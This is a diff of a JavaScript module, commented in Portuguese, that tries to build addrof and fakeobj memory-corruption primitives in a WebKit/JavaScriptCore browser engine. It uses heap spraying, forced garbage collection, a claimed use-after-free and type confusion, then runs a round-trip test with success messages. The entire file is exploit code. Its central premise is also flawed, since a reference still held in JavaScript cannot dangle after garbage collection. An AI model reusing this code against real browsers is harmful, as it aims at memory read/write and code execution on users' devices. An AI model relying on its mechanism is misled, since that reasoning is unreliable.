@@ -1,142 +1,140 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Foco em Primitivas UAF Estáveis)
-import { logS3 } from './s3_utils.mjs';
-import { AdvancedInt64 } from '../utils.mjs';
-import { JSC_OFFSETS } from '../config.mjs';
+// js/script3/testArrayBufferVictimCrash.mjs (Foco em addrof e fakeobj)
+import { logS3, PAUSE_S3 } from './s3_utils.mjs';
+import { AdvancedInt64, toHex } from '../utils.mjs';
 
-export const FNAME_MODULE = "UAF_Primitive_Creation_R57";
+// --- Etapa 1: O Coração do Exploit - Primitivas via UAF ---
 
-// --- Funções Primitivas UAF (o coração do exploit) ---
+// Função auxiliar para forçar a Coleta de Lixo (Garbage Collection)
+function triggerGC() {
+    try {
+        const arr = [];
+        for (let i = 0; i < 2000; i++) {
+            // Aloca e libera memória para pressionar o GC
+            arr.push(new ArrayBuffer(1024 * 64));
+        }
+    } catch (e) {
+        logS3("GC acionado (erro de memória esperado).", "info", "triggerGC");
+    }
+    PAUSE_S3(100); // Pequena pausa para o GC atuar
+}
 
-// Esta função agora é o núcleo da exploração.
-// Ela cria um ambiente UAF e retorna as primitivas funcionais.
-function createUAFPrimitives() {
-    // 1. Prepara o palco com um spray de objetos para criar um estado de heap previsível.
+// Cria as primitivas addrof e fakeobj
+function createAddrofAndFakeobjPrimitives() {
+    logS3("--- Iniciando criação de primitivas addrof/fakeobj via UAF ---", "subtest");
+
+    // Spray para preparar o heap
     let spray = [];
     for (let i = 0; i < 4096; i++) {
-        spray.push({ p0: 0, p1: 0, p2: 0, p3: 0 }); // Objetos de tamanho consistente
+        spray.push([1.1, 2.2, 3.3, 4.4]); // Arrays de double
     }
 
-    // 2. Cria o ponteiro pendurado (dangling pointer) para um dos objetos.
-    let dangling_ref = spray[spray.length - 1]; 
-    spray = null; // Libera a referência principal, tornando os objetos elegíveis para GC.
+    // Cria o ponteiro pendurado para um dos arrays
+    let dangling_ref = spray[spray.length - 1];
+    const original_dangling_value = dangling_ref[0]; // Salva um valor original para verificação
+    spray = null;
 
-    // 3. Força a Coleta de Lixo para liberar a memória do objeto-alvo.
+    // Força o GC para liberar a memória do objeto que `dangling_ref` apontava
     triggerGC();
-    
-    // 4. Spray de Reclamação: Pulveriza Float64Array, que tem um tamanho similar
-    // e provavelmente será alocado na memória recém-liberada.
-    let float_reclaimers = [];
+
+    // Reclama a memória com um tipo de objeto diferente: arrays de objetos
+    let reclaim_spray = [];
     for (let i = 0; i < 2048; i++) {
-        float_reclaimers.push(new Float64Array(8));
+        reclaim_spray.push([{a:1}, {b:2}]);
     }
 
-    // 5. Verifica a confusão de tipos.
-    // Se a propriedade 'p0' do nosso objeto antigo agora se comporta de forma diferente,
-    // o UAF funcionou e 'dangling_ref' agora aponta para um Float64Array.
-    if (typeof dangling_ref.p0 !== 'number') {
-        logS3("UAF bem-sucedido! A referência está corrompida como esperado.", "good", "createUAFPrimitives");
-    } else {
-        throw new Error("A colisão de memória para o UAF não ocorreu. Tente novamente.");
+    // Verifica se a confusão de tipos ocorreu
+    if (dangling_ref[0] === original_dangling_value) {
+        throw new Error("Falha no UAF. A referência pendurada não foi sobrescrita. Tente novamente.");
     }
-    
-    // Agora que 'dangling_ref' é um Float64Array "disfarçado" de objeto,
-    // podemos usá-lo para ler e escrever na memória.
-    
-    const addrof = (obj_to_find) => {
-        // Colocamos o objeto que queremos encontrar o endereço em uma propriedade.
-        // Isso escreve o ponteiro para 'obj_to_find' em uma localização de memória conhecida.
-        dangling_ref.p1 = obj_to_find;
+    logS3("    SUCESSO: Confusão de tipos via UAF confirmada!", "vuln", "createPrimitives");
+    logS3("    A referência `dangling_ref` agora aponta para um array de objetos.", "info");
 
-        // Lemos outra propriedade, que agora sobrepõe a localização do ponteiro,
-        // mas o interpreta como um número de ponto flutuante (double).
-        const addr_double = float_reclaimers[0][0];
+    // Agora `dangling_ref` é a nossa chave para as primitivas
+    const leaker_obj = dangling_ref[0];  // Este é um objeto {a:1}
+    const victim_obj = { shellcode: 0 }; // Objeto que vamos corromper
 
-        // Convertendo o double de volta para um endereço de 64 bits.
+    dangling_ref[1] = victim_obj; // Coloca nosso objeto vítima no array sobreposto
+
+    const original_victim_addr_double = leaker_obj.a;
+
+    // Primitiva ADDR_OF: obtém o endereço de um objeto
+    const addrof = (obj_to_leak) => {
+        leaker_obj.a = obj_to_leak; // Coloca o objeto alvo no lugar do double
+        const leaked_addr_double = victim_obj.shellcode; // Lê o endereço como se fosse um double
+
+        leaker_obj.a = original_victim_addr_double; // Restaura para estabilidade
+
         const buf = new ArrayBuffer(8);
-        (new Float64Array(buf))[0] = addr_double;
+        (new Float64Array(buf))[0] = leaked_addr_double;
         const int_view = new Uint32Array(buf);
         return new AdvancedInt64(int_view[0], int_view[1]);
     };
 
+    // Primitiva FAKE_OBJ: obtém um objeto a partir de um endereço
     const fakeobj = (addr_to_fake) => {
-        // Faz o processo inverso. Converte o endereço de 64 bits para um double.
-        const buf = new ArrayBuffer(8);
-        const int_view = new Uint32Array(buf);
-        int_view[0] = addr_to_fake.low();
-        int_view[1] = addr_to_fake.high();
-        const addr_double = (new Float64Array(buf))[0];
+        // Função para converter o endereço (AdvancedInt64) para double
+        const addressAsDouble = (addr) => {
+            const buf = new ArrayBuffer(8);
+            const int_view = new Uint32Array(buf);
+            int_view[0] = addr.low();
+            int_view[1] = addr.high();
+            return (new Float64Array(buf))[0];
+        };
 
-        // Escreve o double na memória, sobrescrevendo o ponteiro.
-        float_reclaimers[0][0] = addr_double;
+        const addr_double = addressAsDouble(addr_to_fake);
+        victim_obj.shellcode = addr_double; // Escreve o endereço como double
 
-        // Retorna a propriedade que agora "é" o objeto no endereço falsificado.
-        return dangling_ref.p1;
+        const faked_obj = leaker_obj.a; // Lê o objeto "falso" que está no endereço
+        victim_obj.shellcode = original_victim_addr_double; // Restaura
+
+        return faked_obj;
     };
 
+    logS3("    Primitivas `addrof` e `fakeobj` criadas com sucesso!", "good");
     return { addrof, fakeobj };
 }
 
-function triggerGC() {
+
+// --- Etapa 2: Função Principal do Teste ---
+
+export async function executeAddrofAndFakeObjTest() {
     try {
-        const arr = [];
-        for (let i = 0; i < 4096; i++) {
-            arr.push(new ArrayBuffer(1024 * 64)); // Aloca e libera ~256MB
+        logS3("--- Teste de Primitivas (Addrof/Fakeobj) ---", "test");
+
+        // 1. Criar as primitivas
+        const { addrof, fakeobj } = createAddrofAndFakeobjPrimitives();
+
+        // 2. Testar as primitivas
+        logS3("--- Testando a funcionalidade das primitivas ---", "subtest");
+
+        const test_object = { a: 0x41414141, b: 0x42424242 };
+        logS3(`Objeto de teste criado: ${JSON.stringify(test_object)}`, "info");
+
+        // Teste Addrof
+        const test_object_addr = addrof(test_object);
+        logS3(`[addrof] Endereço do objeto de teste: ${test_object_addr.toString(true)}`, "leak");
+        if (test_object_addr.high() === 0 || test_object_addr.low() === 0) {
+            throw new Error("addrof retornou um endereço nulo ou inválido.");
         }
-    } catch(e) {}
-}
+        logS3("[addrof] Teste de `addrof` passou!", "good");
 
+        // Teste Fakeobj
+        const faked_test_object = fakeobj(test_object_addr);
+        logS3(`[fakeobj] Objeto falso criado a partir do endereço.`, "info");
 
-// =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL - Focada em Testar as Primitivas
-// =======================================================================================
-export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { // Mantendo nome da função por compatibilidade
-    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Criação e Teste de Primitivas UAF ---`, "test");
-    
-    try {
-        // --- FASE 1: Criar as primitivas `addrof` e `fakeobj` ---
-        logS3("--- FASE 1: Construindo `addrof` e `fakeobj` via UAF ---", "subtest");
-        const { addrof, fakeobj } = createUAFPrimitives();
-        if (!addrof || !fakeobj) {
-            throw new Error("Falha ao criar as primitivas UAF.");
+        // Verificação final
+        if (faked_test_object.a !== 0x41414141 || faked_test_object.b !== 0x42424242) {
+             throw new Error(`fakeobj falhou. Valores não correspondem. Recebido: a=${toHex(faked_test_object.a)}, b=${toHex(faked_test_object.b)}`);
         }
-        logS3("Primitivas `addrof` e `fakeobj` criadas com sucesso!", "vuln");
+        logS3("[fakeobj] Teste de `fakeobj` passou! Os valores do objeto falso correspondem.", "good");
 
-        // --- FASE 2: Teste de Estabilidade (Ida e Volta) ---
-        logS3("--- FASE 2: Verificando a estabilidade das primitivas ---", "subtest");
-        const test_object = { marker: 0xDEADBEEF };
-        logS3(`Objeto de teste criado: { marker: 0x${test_object.marker.toString(16)} }`, "info");
-
-        // 1. Ida: Pega o endereço do objeto de teste.
-        const leaked_addr = addrof(test_object);
-        logS3(`addrof(test_object) -> Endereço vazado: ${leaked_addr.toString(true)}`, "leak");
-        if(leaked_addr.low() === 0 && leaked_addr.high() === 0) {
-            throw new Error("addrof retornou um endereço nulo.");
-        }
-
-        // 2. Volta: Cria um objeto falso no endereço vazado.
-        const faked_object = fakeobj(leaked_addr);
-        logS3(`fakeobj(leaked_addr) -> Objeto falsificado obtido.`, "info");
-        
-        // 3. Verificação: O objeto falso deve ter a mesma propriedade que o original.
-        logS3(`Verificando... faked_object.marker = 0x${faked_object.marker.toString(16)}`, "info");
-
-        if (faked_object.marker === test_object.marker) {
-            logS3("++++++++ SUCESSO! As primitivas `addrof` e `fakeobj` são estáveis! ++++++++", "vuln");
-            document.title = "Primitives OK!";
-            return {
-                final_result: {
-                    success: true,
-                    message: "Primitivas addrof/fakeobj estáveis foram criadas e verificadas."
-                }
-            };
-        } else {
-            throw new Error("Teste de ida e volta falhou. O marcador do objeto não corresponde.");
-        }
+        logS3("TODOS OS TESTES DE PRIMITIVAS PASSARAM!", "vuln");
+        document.title = "Addrof/Fakeobj SUCCESS!";
+        return { success: true, addrof, fakeobj };
 
     } catch (e) {
-        logS3(`A cadeia de exploração falhou: ${e.message}`, "critical");
-        document.title = "Primitives Failed";
-        return { errorOccurred: e.message };
+        logS3(`O teste de primitivas falhou: ${e.message}`, "critical");
+        document.title = "Addrof/Fakeobj FAIL";
+        return { success: false, errorOccurred: e.message };
     }
 }
